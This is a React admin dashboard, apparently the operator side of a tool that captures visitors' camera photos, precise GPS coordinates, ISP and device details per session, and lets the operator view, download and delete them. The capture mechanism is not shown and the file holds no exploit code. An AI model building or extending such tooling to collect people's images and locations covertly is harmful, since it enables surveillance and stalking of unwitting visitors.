import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabaseClient } from "../supabaseClient";
import "./AdminDashboard.css";

export default function AdminDashboard({ onLogout }) {
  const navigate = useNavigate();
  const [images, setImages] = useState([]);
  const [locations, setLocations] = useState([]);
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedImage, setSelectedImage] = useState(null);
  const [filter, setFilter] = useState("all"); // 'all', 'today', 'week', 'month'

  const handleLogout = () => {
    if (onLogout) {
      onLogout();
      navigate("/admin");
    }
  };
  const downloadPhoto = async (imageUrl, sessionId) => {
    try {
      const response = await fetch(imageUrl);
      const blob = await response.blob();

      // Create a temporary URL for the blob
      const blobUrl = window.URL.createObjectURL(blob);

      // Create a temporary link element
      const link = document.createElement("a");
      link.href = blobUrl;
      link.download = `SONA_${sessionId}_${new Date().getTime()}.jpg`;

      // Trigger the download
      document.body.appendChild(link);
      link.click();

      // Cleanup
      document.body.removeChild(link);
      window.URL.revokeObjectURL(blobUrl);
    } catch (err) {
      alert("Error downloading image: " + err.message);
    }
  };
  useEffect(() => {
    fetchAllData();
  }, []);

  const fetchAllData = async () => {
    try {
      setLoading(true);

      const [imagesData, locationsData, devicesData] = await Promise.all([
        supabaseClient
          .from("images_table")
          .select("*")
          .order("created_at", { ascending: false }),
        supabaseClient
          .from("location_table")
          .select("*")
          .order("created_at", { ascending: false }),
        supabaseClient
          .from("device_table")
          .select("*")
          .order("created_at", { ascending: false }),
      ]);

      if (imagesData.error) throw imagesData.error;
      if (locationsData.error) throw locationsData.error;
      if (devicesData.error) throw devicesData.error;

      setImages(imagesData.data || []);
      setLocations(locationsData.data || []);
      setDevices(devicesData.data || []);
      setError(null);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const deleteImage = async (img) => {
    if (!confirm("Are you sure you want to delete this image?")) return;

    try {
      // Extract filename from URL
      const fileName = img.image_url.split("/").pop();

      // Delete from storage
      await supabaseClient.storage.from("images").remove([fileName]);

      // Delete from database
      await supabaseClient.from("images_table").delete().eq("id", img.id);

      // Update state
      setImages(images.filter((i) => i.id !== img.id));
      setSelectedImage(null);
    } catch (err) {
      alert("Error deleting image: " + err.message);
    }
  };

  const deleteCompleteSession = async (sessionId) => {
    if (
      !confirm(
        "Are you sure you want to delete this entire session? This will remove all data (image, location, and device info)."
      )
    )
      return;

    try {
      // Find and delete the image
      const img = images.find((i) => i.session_id === sessionId);
      if (img) {
        const fileName = img.image_url.split("/").pop();
        const storageResult = await supabaseClient.storage
          .from("images")
          .remove([fileName]);
        if (storageResult.error) {
          throw new Error(
            `Failed to delete image from storage: ${storageResult.error.message}`
          );
        }

        const imgDeleteResult = await supabaseClient
          .from("images_table")
          .delete()
          .eq("session_id", sessionId);
        if (imgDeleteResult.error) {
          throw new Error(
            `Failed to delete image: ${imgDeleteResult.error.message}`
          );
        }
      }

      // Delete location data
      const locDeleteResult = await supabaseClient
        .from("location_table")
        .delete()
        .eq("session_id", sessionId);
      if (locDeleteResult.error) {
        throw new Error(
          `Failed to delete location: ${locDeleteResult.error.message}`
        );
      }

      // Delete device data
      const devDeleteResult = await supabaseClient
        .from("device_table")
        .delete()
        .eq("session_id", sessionId);
      if (devDeleteResult.error) {
        throw new Error(
          `Failed to delete device: ${devDeleteResult.error.message}`
        );
      }

      // Update states
      setImages(images.filter((i) => i.session_id !== sessionId));
      setLocations(locations.filter((l) => l.session_id !== sessionId));
      setDevices(devices.filter((d) => d.session_id !== sessionId));
      setSelectedImage(null);

      alert("Session deleted successfully!");
    } catch (err) {
      alert("Error deleting session: " + err.message);
    }
  };

  const filterImages = () => {
    if (filter === "all") return images;

    const now = new Date();
    const filtered = images.filter((img) => {
      const imgDate = new Date(img.created_at);
      const diffTime = Math.abs(now - imgDate);
      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));

      if (filter === "today") return diffDays <= 1;
      if (filter === "week") return diffDays <= 7;
      if (filter === "month") return diffDays <= 30;
      return true;
    });

    return filtered;
  };

  const filteredImages = filterImages();

  // Create lookup maps for locations and devices by session_id
  const locationsBySession = {};
  locations.forEach((loc) => {
    locationsBySession[loc.session_id] = loc;
  });

  const devicesBySession = {};
  devices.forEach((dev) => {
    devicesBySession[dev.session_id] = dev;
  });

  if (loading)
    return (
      <div className="admin-container">
        <p className="loading-text">Loading...</p>
      </div>
    );
  if (error)
    return (
      <div className="admin-container">
        <p className="error">Error: {error}</p>
      </div>
    );

  return (
    <div className="admin-container">
      <div className="admin-header">
        <h1>🕵️ Admin Dashboard</h1>
        <button className="logout-btn" onClick={handleLogout}>
          🚪 Logout
        </button>
      </div>

      <div className="dashboard-grid">
        {/* Individual Image Cards */}
        <div className="section">
          <div className="combined-header">
            <h2>📸 Captured Images ({filteredImages.length})</h2>
            <div className="filter-buttons">
              <button
                className={filter === "all" ? "active" : ""}
                onClick={() => setFilter("all")}
              >
                All
              </button>
              <button
                className={filter === "today" ? "active" : ""}
                onClick={() => setFilter("today")}
              >
                Today
              </button>
              <button
                className={filter === "week" ? "active" : ""}
                onClick={() => setFilter("week")}
              >
                Week
              </button>
              <button
                className={filter === "month" ? "active" : ""}
                onClick={() => setFilter("month")}
              >
                Month
              </button>
            </div>
          </div>

          {filteredImages.length === 0 ? (
            <p>No images found</p>
          ) : (
            <div className="cards-grid">
              {filteredImages.map((img) => {
                const loc = locationsBySession[img.session_id];
                const dev = devicesBySession[img.session_id];

                return (
                  <div key={img.id} className="info-card combined-card">
                    {/* Image */}
                    <div className="card-image-container">
                      <img
                        src={img.image_url}
                        alt="Captured"
                        className="card-image-preview"
                        onClick={() => setSelectedImage(img)}
                        style={{ cursor: "pointer" }}
                      />
                      <div className="image-buttons">
                        <button
                          className="img-btn view-btn"
                          onClick={() => setSelectedImage(img)}
                          title="View Photo"
                        >
                          👁️ View
                        </button>
                        <button
                          className="img-btn download-btn"
                          onClick={() =>
                            downloadPhoto(img.image_url, img.session_id)
                          }
                          title="Download Photo"
                        >
                          ⬇️ Download
                        </button>
                        <button
                          className="img-btn delete-btn"
                          onClick={() => deleteImage(img)}
                          title="Delete Image"
                        >
                          🗑️ Delete
                        </button>
                      </div>
                    </div>

                    {/* Location Section */}
                    {loc && (
                      <>
                        <div className="card-header location-header">
                          <span className="card-icon">📍</span>
                          <span className="card-type">{loc.location_type}</span>
                        </div>
                        <div className="card-body">
                          <div className="card-row">
                            <span className="label">Location:</span>
                            <span className="value">
                              {loc.city}, {loc.country}
                            </span>
                          </div>
                          <div className="card-row">
                            <span className="label">Region:</span>
                            <span className="value">{loc.region || "N/A"}</span>
                          </div>
                          <div className="card-row">
                            <span className="label">Coordinates:</span>
                            <span className="value">
                              {loc.latitude.toFixed(4)},{" "}
                              {loc.longitude.toFixed(4)}
                            </span>
                          </div>
                          <div className="card-row">
                            <span className="label">ISP:</span>
                            <span className="value">{loc.isp}</span>
                          </div>
                          <div className="card-row">
                            <span className="label">Accuracy:</span>
                            <span className="value">
                              {loc.accuracy
                                ? Math.round(loc.accuracy) + "m"
                                : "N/A"}
                            </span>
                          </div>
                        </div>
                        <div className="card-footer">
                          <a
                            href={`https://maps.google.com/maps?q=${loc.latitude},${loc.longitude}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="map-link"
                          >
                            🗺️ View on Map
                          </a>
                        </div>
                      </>
                    )}

                    {/* Device Section */}
                    {dev && (
                      <>
                        <div className="card-header device-header">
                          <span className="card-icon">🖥️</span>
                          <span className="card-type">{dev.platform}</span>
                        </div>
                        <div className="card-body">
                          <div className="card-row">
                            <span className="label">Browser:</span>
                            <span className="value">{dev.browser}</span>
                          </div>
                          <div className="card-row">
                            <span className="label">Battery:</span>
                            <span className="value battery-info">
                              {dev.battery_level}
                              {dev.is_charging && " ⚡"}
                            </span>
                          </div>
                          <div className="card-row">
                            <span className="label">Network:</span>
                            <span className="value">{dev.network_type}</span>
                          </div>
                          <div className="card-row">
                            <span className="label">Speed:</span>
                            <span className="value">{dev.internet_speed}</span>
                          </div>
                          <div className="card-row">
                            <span className="label">Screen:</span>
                            <span className="value">
                              {dev.screen_resolution}
                            </span>
                          </div>
                        </div>
                      </>
                    )}

                    {/* Timestamp Footer */}
                    <div className="card-timestamp">
                      📅{" "}
                      {new Date(
                        loc?.created_at || dev?.created_at
                      ).toLocaleString()}
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>

      <button className="refresh-btn" onClick={fetchAllData}>
        🔄 Refresh
      </button>

      {/* Image Modal */}
      {selectedImage && (
        <div className="modal-overlay" onClick={() => setSelectedImage(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <button
              className="modal-close"
              onClick={() => setSelectedImage(null)}
            >
              ✕
            </button>
            <img
              src={selectedImage.image_url}
              alt="Full size"
              className="modal-image"
            />
            <div className="modal-info">
              <p>
                <strong>Captured:</strong>{" "}
                {new Date(selectedImage.created_at).toLocaleString()}
              </p>
              <p>
                <strong>Session ID:</strong> {selectedImage.session_id}
              </p>
              <div className="modal-actions">
                <a
                  href={selectedImage.image_url}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="download-btn"
                >
                  ⬇️ Open Original
                </a>
                <button
                  className="delete-btn"
                  onClick={() => deleteImage(selectedImage)}
                >
                  🗑️ Delete
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
